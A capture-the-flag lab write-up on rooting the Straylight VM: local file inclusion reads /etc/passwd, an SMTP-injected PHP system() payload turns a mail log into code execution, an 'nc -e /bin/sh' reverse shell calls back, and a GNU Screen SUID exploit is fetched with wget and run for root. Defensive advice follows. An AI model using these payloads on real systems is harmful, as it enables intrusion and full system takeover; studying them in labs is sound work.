# CTF Writeup — Straylight

**Dates:** 20–21 May 2026  
**Target:** Straylight VM (192.168.1.45)  
**Attacker:** Kali Linux (192.168.1.21)  
**Network:** NAT Network (Bridge Adapter)  
**Goal:** Gain root access via web vulnerability + privilege escalation

> ⚠️ Isolated lab environment. No real systems targeted.

---

## Enumeration

```bash
ip a      # confirm kali IP = 192.168.1.21
ip r      # check routing table
arp-scan 192.168.1.0/24   # discover hosts on network
# Found: 192.168.1.45 → Straylight machine
```

---

## Web Application — LFI (Local File Inclusion)

Discovered a vulnerable PHP page on the target:

```
http://192.168.1.45/turing-bolo/bolo.php?bolo=armitage
http://192.168.1.45/turing-bolo/bolo.php?bolo=case
```

**Testing for LFI:**
```
# Read /etc/passwd
http://192.168.1.45/turing-bolo/bolo.php?bolo=/etc/passwd

# Read log files
http://192.168.1.45/turing-bolo/bolo.php?bolo=/var/log/dpkg.log
http://192.168.1.45/turing-bolo/bolo.php?bolo=/var/log/mail
```

**Finding:** The `bolo` parameter is vulnerable to LFI — reading arbitrary files from the system.

---

## Log Poisoning → Remote Code Execution

**Concept:** Inject PHP code into mail log via Telnet SMTP, then execute it via LFI.

```bash
# Step 1 — Inject PHP payload into mail log via SMTP
telnet 192.168.1.45 25
# Connected to straylight ESMTP Postfix

mail from:hacker2@localhost
rcpt to:root
subject:"<?php system($_GET["cmd"]);?>"
# Connection closed — payload written to /var/log/mail
```

**Step 2 — Execute commands via poisoned log:**
```
http://192.168.1.45/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=ifconfig

# View source to see output clearly
view-source:http://192.168.1.45/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=ifconfig
```

**Result:** Remote Code Execution (RCE) achieved via log poisoning.

---

## Reverse Shell

```bash
# Kali — set up listener
nc -nlvp 5522

# Browser — trigger reverse shell via RCE
http://192.168.1.45/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc -e /bin/sh 192.168.1.21 5522

# Shell received on Kali — upgrade to interactive TTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Tools used:** HackTools Firefox extension (for quick payload generation)

---

## Privilege Escalation — SUID Binary

```bash
# Find SUID binaries (run as owner regardless of who executes)
find / -perm -u=s

# Found: GNU Screen 4.5.0 — known local privilege escalation vulnerability
# Research on Kali:
searchsploit screen 4.5.0
searchsploit -m linux/local/41154.sh   # copy exploit to current directory

# Host exploit via Python HTTP server
python -m http.server

# On Straylight — download and execute
wget http://192.168.1.21:8000/41154.sh
chmod +x 41154.sh
./41154.sh
```

**Result:** Root shell obtained via GNU Screen 4.5.0 SUID exploit.

---

## Privilege Escalation Methods Reference

| Method | Description |
|--------|-------------|
| Kernel exploit | Exploit unpatched kernel vulnerability |
| Password mining | Search config files, history, logs for credentials |
| GTFOBins | Misuse legitimate binaries to escalate |
| NFS | Exploit misconfigured NFS shares |
| CRON | Hijack scheduled tasks running as root |
| SUID | Execute binaries that run as root regardless of caller |

---

## Key Takeaways

1. **LFI → Log Poisoning → RCE** is a classic attack chain — any user-controlled input reaching a log file can become code execution
2. **Telnet/SMTP** still runs on many systems and can be abused for log injection
3. **SUID binaries** are a critical escalation vector — always check with `find / -perm -u=s`
4. **GTFOBins** (gtfobins.github.io) lists every binary that can be abused for privilege escalation
5. **Searchsploit** is the offline Exploit-DB — fast lookup without internet

---

## Blue Team — How to Detect/Prevent This

| Attack | Defence |
|--------|---------|
| LFI | Input validation, disable `allow_url_include`, WAF |
| Log poisoning | Strip special chars from log entries, restrict log file permissions |
| RCE via PHP | Disable `system()`, `exec()` functions in PHP config |
| SUID abuse | Audit SUID binaries regularly, remove unnecessary ones |
